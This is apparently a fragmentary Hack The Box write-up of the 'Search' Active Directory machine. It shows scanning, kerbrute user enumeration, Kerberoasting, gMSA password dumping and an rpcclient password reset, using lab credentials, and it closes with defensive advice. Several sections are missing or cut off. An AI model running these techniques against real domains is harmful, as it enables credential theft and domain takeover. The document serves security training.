<h2 id="2-initial-enumeration-reconnaissance">2. Initial Enumeration: Reconnaissance</h2>
<h3 id="2-1-why-start-with-nmap">2.1 Why Start with Nmap?</h3>
<p><strong>Command:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li><code>-sC</code>: Runs default NSE scripts (service detection, banner grabbing)</li>
<li><code>-sV</code>: Probes service versions</li>
<li><code>-p-</code>: Scans ALL 65,535 TCP ports (not just the top 1,000)</li>
<li><code>--min-rate=10000</code>: Sends packets fast to speed up the scan</li>
<li><code>-oN</code>: Saves output to a file for reference</li>
</ul>
<p><strong>Why add to <code>/etc/hosts</code>?</strong></p>
<blockquote>
<p>Many Windows services (especially Kerberos, LDAP, and IIS with virtual hosts) require the <strong>fully qualified domain name (FQDN)</strong> to respond correctly. If you query <code>search.htb</code> without DNS resolution, the domain controller won't recognize the request as targeting the domain.</p>
</blockquote>

<h2 id="4-username-enumeration-with-kerbrute">4. Username Enumeration with Kerbrute</h2>
<h3 id="4-1-what-is-kerbrute">4.1 What is Kerbrute?</h3>
<p><strong>Command:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">cat &gt; users.txt &lt;&lt; 'EOF'
Dax.Santiago
Keely.Lyons
Sierra.Frye
Kyla.Stewart
Kaiara.Spencer
Dave.Simpson
Ben.Thompson
Chris.Stewart
Hope.Sharp
EOF

kerbrute userenum users.txt -d search.htb --dc 10.129.229.57
</code></pre>
<p><strong>What Kerbrute does:</strong>
Kerbrute exploits a <strong>Kerberos protocol behavior</strong>: when you send an Authentication Service Request (AS-REQ) with a valid username, the Key Distribution Center (KDC) responds differently than for an invalid username.</p>
<ul>
<li><strong>Valid username</strong>: <code>KDC_ERR_PREAUTH_REQUIRED</code> (error code 25)</li>
<li><strong>Invalid username</strong>: <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (error code 6)</li>
</ul>
<p><strong>Why enumerate users?</strong></p>
<blockquote>
<p>You cannot attack what you don't know exists. A list of valid usernames is the foundation of password spraying, Kerberoasting, and AS-REP roasting.</p>
</blockquote>

<h2 id="6-kerberoasting-harvesting-service-account-hashes">6. Kerberoasting: Harvesting Service Account Hashes</h2>
<h3 id="6-1-what-is-kerberoasting">6.1 What is Kerberoasting?</h3>
<p><strong>Command:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">sudo ntpdate 10.129.229.57
GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsKey?'
</code></pre>
<p><strong>What this does:</strong></p>
<ol>
<li><code>ntpdate</code> synchronizes your clock with the domain controller (Kerberos is extremely time-sensitive - clock skew &gt; 5 minutes causes failures)</li>
<li><code>GetUserSPNs.py</code> queries LDAP for accounts with <strong>Service Principal Names (SPNs)</strong></li>
<li>For each SPN found, it requests a <strong>Ticket Granting Service (TGS)</strong> ticket</li>
<li>The TGS ticket is encrypted with the service account's password hash</li>
<li>We save this ticket offline and crack it</li>
</ol>
<p><strong>Why Kerberoasting?</strong></p>
<blockquote>
<p>Service accounts often have:</p>
</blockquote>
<ul>
<li>Weak passwords (because they never log in interactively)</li>
<li>No password rotation policy</li>
<li>High privileges</li>
</ul>


<h3 id="6-2-the-hash">6.2 The Hash</h3>
<p><strong>Output:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 10"><code>ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;

REDACTED_KERBEROS_MATERIAL
</code></pre>
<p><strong>Why <code>web_svc</code> matters:</strong>
The <code>&lt;never&gt;</code> last logon tells us this is a <strong>service account</strong> that doesn't log in interactively. The SPN <code>RESEARCH/web_svc.search.htb:60001</code> confirms it's used for some web service.</p>

<p><strong>The XML tag looks like:</strong></p>

<p><strong>Mechanism:</strong></p>
<blockquote>
<p>The password doesn't encrypt the data - it just prevents Excel from displaying it. By removing the XML tag, Excel no longer knows the cells are "protected."</p>
</blockquote>

<h2 id="12-gmsa-abuse-the-hidden-service-account">12. GMSA Abuse: The Hidden Service Account</h2>
<h3 id="12-1-what-is-a-gmsa">12.1 What is a GMSA?</h3>
<p><strong>Command:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
</code></pre>
<p><strong>Output:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 26"><code>BIR-ADFS-GMSA$:::REDACTED_HASH_OR_FLAG
BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:REDACTED_ENCODED_LAB_MATERIAL
BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:REDACTED_HASH_OR_FLAG
</code></pre>
<p><strong>What is a GMSA?</strong></p>
<blockquote>
<p><strong>Group Managed Service Account (GMSA)</strong> is a special AD account type where:</p>
</blockquote>
<ul>
<li>The password is automatically generated and rotated by Active Directory</li>
<li>The password is <strong>240 bytes</strong> of random data - impossible to crack</li>
<li>Only specific security principals (groups/users) can retrieve the password</li>
</ul>
<p><strong>Why GMSAs are dangerous:</strong></p>
<blockquote>
<p>The password itself is uncrackable, but <strong>who can read it</strong> is what matters. If a regular user (or group they belong to) has <code>ReadGMSAPassword</code> permission, they can retrieve the plaintext-equivalent hash and act as the GMSA.</p>
</blockquote>

<h2 id="13-domain-admin-via-genericall">13. Domain Admin via GenericAll</h2>
<h3 id="13-1-what-is-genericall">13.1 What is GenericAll?</h3>
<p><code>GenericAll</code> is the <strong>highest level of access</strong> in Active Directory ACLs. It means:</p>
<ul>
<li>Read all attributes</li>
<li>Write all attributes</li>
<li>Delete the object</li>
<li><strong>Reset the password</strong></li>
<li>Modify group membership</li>
<li>Etc.</li>
</ul>
<h3 id="13-2-resetting-tristan-davies-password">13.2 Resetting Tristan.Davies' Password</h3>

Password: REDACTED_HASH_OR_FLAG

rpcclient $&gt; setuserinfo2 tristan.davies 23 'qwerty1234!'
</code></pre>
<p><strong>What <code>setuserinfo2</code> does:</strong></p>
<ul>
<li><code>setuserinfo2</code> is an MS-RPC function to modify user attributes</li>

<h3 id="why-this-machine-is-hard">Why This Machine is "Hard"</h3>
<p>This machine is rated <strong>Hard</strong> not because any single step is impossible, but because:</p>
<ol>
<li>It requires <strong>chaining 10+ steps</strong> together</li>
<li>Each step depends on the previous one</li>
<li>It tests <strong>multiple domains of knowledge</strong>: web, SMB, Kerberos, AD, certificates, PowerShell</li>
<li>The path to Domain Admin is <strong>indirect</strong> : you must follow the permission chain</li>
</ol>
<h3 id="the-most-important-lesson">The Most Important Lesson</h3>

<h3 id="defensive-recommendations">Defensive Recommendations</h3>
<ol>
<li><strong>Do not put credentials in images or public documents</strong></li>
<li><strong>Enforce unique passwords</strong> for service accounts (no reuse)</li>
<li><strong>Monitor for Kerberoasting</strong> : alerts on TGS requests from non-service accounts</li>
<li><strong>Review BloodHound regularly</strong> : know your shortest paths to Domain Admin</li>
<li><strong>Audit GMSA permissions</strong> : limit who can read managed passwords</li>
<li><strong>Remove GenericAll</strong> where possible - use more granular permissions</li>
<li><strong>Rotate leaked credentials immediately</strong> when phishing simulations end</li>
<li><strong>Encrypt and protect backup certificates</strong> : don't store them in user folders</li>
</ol>
